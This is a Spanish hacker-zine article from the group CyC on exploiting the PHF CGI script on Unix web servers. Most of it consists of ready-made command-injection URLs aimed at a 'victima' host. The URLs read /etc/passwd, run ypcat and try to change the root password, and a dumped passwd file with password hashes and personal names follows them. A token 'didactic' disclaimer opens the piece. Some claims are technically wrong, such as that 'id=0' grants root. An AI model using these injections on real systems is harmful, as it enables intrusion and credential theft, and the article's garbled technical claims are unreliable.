0x05

===============================================================

	Numero del articulo: 05-1
	A cargo de: ^Raju^ <Sauronhack@ozu.es>
	Titulo: PHF
	Nivel de Hack: Medio

===============================================================

INDICE

	* 1-. Presentacion y advertencias

	* 2-. ¿Que es exactamente el PHF?
	
	* 3-. Komo utilizar el PHF
	
	* 4-. Resultados

	* 5-. Komo hacerte ROOT Kon el PHF

	* 6-. Despedida

---------------------------------------------------------------- 


	1-. Este texto esta realizado kon fines puramente didactikos y para un superacion 
intelectual y esas cosas, ke no te estoy poniendo un pistola en la cabeza para ke lo leas. 
Todo lo que hagas kon lo enseñado es tu problema (eso es lo ke decia el ke puso la por 
escrito el komo hacer la primera bomba atomica no?.
	    Este texto se basa solo en el PHF ya que he ojeado alguno txt sobre el tema 
pero se dejaban alguna kosa y decidi realizarlo para aclararlo. 	
	  

	2-. Bueno este sistema de hackeo es ya bastante antiguo pero sigue rulando. 
solo necesitas un navegador.
	    ¿Exactamente ke es el PHF? el Phf es un archivo ke esta en el directorio 
/cgi-bin de los equipos unix su uso no delictivo es el de buskeda de direcciones 
(kon lo que nos hace pensar que tiene ke estar ese servicio aktivo).
	
	
	3-. Su uso es sencillo solo tienes ke kolocar en el navegador la siguente 
linea (sin las comillas):    


http://www.victima.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
(                     )(                      )(         )(        )
	
	 A                        B                c           D


A: La dirección de la makina

B: Akí se especifika el servicio

C: Akí se refiere al comando cat o komo en dos seria el edit %20     sirve komo espacio.

D: akí se koloca el directorio kon el archivo ke se desea ver en este kaso es de los 
password´s.

4-.  Posibles resultados
Pueden okurrir varias kosas:

1: ke no no rule con lo ke el servicio phf no esta abierto kon lo ke a joderse "siga 
jugando hay miles de premios esperando" komo en los añorados petacetas de mi infancia.

2: ke te salga el fichero de pass pero puede estar sadow o ke el NIS este instalado y 
en este kaso en la ultima linea apareceria "+::0:0:::" esto en la ultima linea entonces 
prueba /etc/passwd. En el kaso de ke te salga la linea anterior entonces tentras ke utilizar 
el comando ypcat para editar el passwd. En ese caso la direccio cambia a:


http://www.victima.com/cgi-in/phf?Qalias=x%0a/bin/ypcat%20passwd  
				   	          (              )
		                			A

A: Hemos kambiado el komando luego hemos puesto un espacio %20 y luego el nombre del fichero.


root:R0rmc6lxVwi5I:0:0:root:/root:/bin/bash
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/sbin:
adm:*:3:4:adm:/var/adm:
lp:*:4:7:lp:/var/spool/lpd:
sync:*:5:0:sync:/sbin:/bin/sync
shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
halt:*:7:0:halt:/sbin:/sbin/halt
mail:*:8:12:mail:/var/spool/mail:
news:*:9:13:news:/usr/lib/news:
uucp:*:10:14:uucp:/var/spool/uucppublic:
operator:*:11:0:operator:/root:/bin/bash
games:*:12:100:games:/usr/games:
man:*:13:15:man:/usr/man:
postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash
nobody:*:-2:100:nobody:/dev/null:
ftp:*:404:1::/home/ftp:/bin/bash
guest:*:405:100:guest:/dev/null:/dev/nulljose marquezn:LkjLiWy08xIWY:501:100:Jose Marquez:/home/bhilton:/bin/bash
web:Kn0d4HJPfRSoM:502:100:Web Master:/home/web:/bin/bash
Rosa:EauDLA/PT/HQg:503:100:Rosa C. Marquez:/home/Rosa:/bin/bash

El resto te lo imaginas no? Pues salvas y ya esta.


5-. konseguir acceso komo root atrabes del PHF

http://www.victima.com/cgi-bin/phf?Qalias=x%0a/usr/bin/id=0

kon el id=0 te identificas komo root, kon el id solo te identificas komo nobody. 
Osea que si no te funciona utilizandolo komo root que es normal, pruebas komo nobody.

Si te das kunta se pueden ejecutar komandos unix komo cat o ycat. Si konseguimos 
ser root porke no utilizar algun komando para kambiar el password de root. 
Seria de la siguinete forma:


 http://www.victima.com/cgi-bin/phf?Qalias=x%0apasswd%20root



   El resto es echarle imaginacion y seguir las bases expuetas anteriormente.


6-. Despedida:


Espero ke os hallais divertido tanto komo yo y un konsejo utilizar para estos bug´s 
netescape u otro ke no sea de mocochoft. Y esas cosas este articulo es de libre 
distribucio siempre que se deje el nombre y ke se explique ke es de uno de los 
miembros del grupo hack de  CyC. Para mas información mandar un mail a Sauronhack@ozu.es.   


